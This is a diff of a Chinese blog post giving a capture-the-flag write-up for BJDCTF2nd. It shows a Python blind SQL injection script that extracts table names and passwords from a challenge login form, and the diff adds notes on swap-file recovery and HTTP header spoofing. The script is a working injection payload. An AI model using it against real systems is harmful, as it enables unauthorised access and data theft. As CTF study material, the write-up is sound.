@@ -27,7 +27,8 @@
 <meta property="og:image" content="https://i.loli.net/2020/03/27/ft16eFsMpgQ2chR.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/27/jsA3fnRrdDY1yik.png">
 <meta property="og:image" content="https://i.loli.net/2020/03/27/5fSGD9wTxPyKBpv.png">
-<meta property="og:updated_time" content="2020-03-27T18:12:16.297Z">
+<meta property="og:image" content="https://i.loli.net/2020/03/29/7YeDwhzNb3Vsqoc.png">
+<meta property="og:updated_time" content="2020-03-29T02:21:21.562Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="BJDCTF2nd">
 <meta name="twitter:description" content="新手赛，看来我不是一个合格的新手。记录一下，不然会忘。">
@@ -204,7 +205,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">1.7k字</span>
+        <span class="post-count">1.8k字</span>
       </span>
     </span>
 
@@ -213,7 +214,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">8分</span>
+        <span class="post-count">9分</span>
       </span>
     </span>
 </div>
@@ -241,7 +242,7 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://bad6a7d7-7c67-4b08-8083-fbda7d88b93e.node3.buuoj.cn&quot;</span><br><span class="line"></span><br><span class="line">flag=&apos;&apos;#定义一个空字符串</span><br><span class="line"></span><br><span class="line">for i in range(1,20):	</span><br><span class="line">	low=32</span><br><span class="line">	high=126</span><br><span class="line">	mid=(low+high)//2## 二分法</span><br><span class="line">	while high&gt;low:</span><br><span class="line">		</span><br><span class="line">		#payload=&apos;or ascii(substr((database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		payload=&apos;or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;#&apos;.format(i,mid)</span><br><span class="line">		data=&#123;</span><br><span class="line">			&apos;username&apos;:&apos;admin \\&apos;,</span><br><span class="line">			&apos;password&apos;:payload</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		r=requests.post(url,data=data)	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">		if &apos;stronger&apos; in r.text:</span><br><span class="line">			low = mid+1</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">		else:</span><br><span class="line">			high=mid	</span><br><span class="line">			mid=(low+high)//2</span><br><span class="line">	flag+=chr(mid)#将ascii值转为字符</span><br><span class="line">	print(flag)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
 
 <p>ps：这里直接爆password就可以了，不用头铁去爆库爆表。。。database查出来了，但表名就查不了，至少我没查出来。<br><img src="https://i.loli.net/2020/03/25/5YMSP1hZqxFutsb.png" alt="bjd sql1.png"><br>得到密码，登录。<br><img src="https://i.loli.net/2020/03/25/FAMSKQ35qgBewYN.png" alt="bjd sql2.png">  </p>
-<h1 id="duang-shell"><a href="#duang-shell" class="headerlink" title="duang_shell"></a>duang_shell</h1><p>大概就是要用两个账号，一个开linux内网靶机，一个开本题。因为不能访问外网，题目有写。<br>先连接得题目服务器IP，然后反弹shell。<br>没有做过这种题，照着1fonly师傅的wp搞了好久，现在真的不想再做一遍了，下次一定，下次一定。  </p>
+<h1 id="duang-shell"><a href="#duang-shell" class="headerlink" title="duang_shell"></a>duang_shell</h1><p>.index.php.swp用vim -r复原。<br>之后大概就是要用两个账号，一个开linux内网靶机，一个开本题。因为不能访问外网，题目有写。<br>先连接得题目服务器IP，然后反弹shell。<br>没有做过这种题，照着1fonly师傅的wp搞了好久，现在真的不想再做一遍了，下次一定，下次一定。  </p>
 <h1 id="XSS之光"><a href="#XSS之光" class="headerlink" title="XSS之光"></a>XSS之光</h1><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>拿着白嫖来的扫描器。发现git泄露。<br>再用GitHack down下来。得到：  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = $_GET[&apos;yds_is_so_beautiful&apos;];</span><br><span class="line">echo unserialize($a);</span><br></pre></td></tr></table></figure>
 
@@ -282,7 +283,7 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
 <ul>
 <li>设置MD5“your_ip_address”=md5本机ip</li>
 <li>MD5“y1ng”=y1ng的md5的sha-1<br>其次$decr === $cipher比较：  </li>
-<li>因为data是null，就可以用他的函数来算出cipher，再传入相同的decr就可以了。<br>然后用python脚本分别设置chockie、session。原理是一样的。  </li>
+<li>因为data是null，就可以用他的函数来算出cipher，再传入相同的decr就可以了。<br>然后用python脚本分别设置chockie、session。原理是一样的。  <h1 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h1>之前觉得就是接下头就没去复现，结果接着来的MRCTF就遇到了，我？？？<br>主要问题就是xff没有用了，一个精简的总结：<br><img src="https://i.loli.net/2020/03/29/7YeDwhzNb3Vsqoc.png" alt="ip.png"><br>此外还有一个浏览器需要去查一下，题目给的上的不对：User-Agent:Commodore 64<br>其他参照：<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers" target="_blank" rel="noopener">MDN</a>  </li>
 </ul>
 
       
@@ -434,7 +435,7 @@ select * from users where username='$_POST["username"]' and password='$_POST["pa
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单注入"><span class="toc-number">1.</span> <span class="toc-text">简单注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#burp-fuzz"><span class="toc-number">1.1.</span> <span class="toc-text">burp fuzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#robots-txt提示"><span class="toc-number">1.2.</span> <span class="toc-text">robots.txt提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">1.3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本"><span class="toc-number">1.4.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#duang-shell"><span class="toc-number">2.</span> <span class="toc-text">duang_shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS之光"><span class="toc-number">3.</span> <span class="toc-text">XSS之光</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#目录扫描"><span class="toc-number">3.1.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php原生类"><span class="toc-number">3.2.</span> <span class="toc-text">php原生类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#feak-google"><span class="toc-number">4.</span> <span class="toc-text">feak google</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#old-hack"><span class="toc-number">5.</span> <span class="toc-text">old hack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件探测"><span class="toc-number">6.</span> <span class="toc-text">文件探测</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#简单注入"><span class="toc-number">1.</span> <span class="toc-text">简单注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#burp-fuzz"><span class="toc-number">1.1.</span> <span class="toc-text">burp fuzz</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#robots-txt提示"><span class="toc-number">1.2.</span> <span class="toc-text">robots.txt提示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-number">1.3.</span> <span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#脚本"><span class="toc-number">1.4.</span> <span class="toc-text">脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#duang-shell"><span class="toc-number">2.</span> <span class="toc-text">duang_shell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS之光"><span class="toc-number">3.</span> <span class="toc-text">XSS之光</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#目录扫描"><span class="toc-number">3.1.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php原生类"><span class="toc-number">3.2.</span> <span class="toc-text">php原生类</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#feak-google"><span class="toc-number">4.</span> <span class="toc-text">feak google</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#old-hack"><span class="toc-number">5.</span> <span class="toc-text">old hack</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件探测"><span class="toc-number">6.</span> <span class="toc-text">文件探测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#假猪套天下第一"><span class="toc-number">7.</span> <span class="toc-text">假猪套天下第一</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -546,10 +547,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Python</a>
               </li>
              
@@ -559,6 +556,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">xun9er日常废话</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
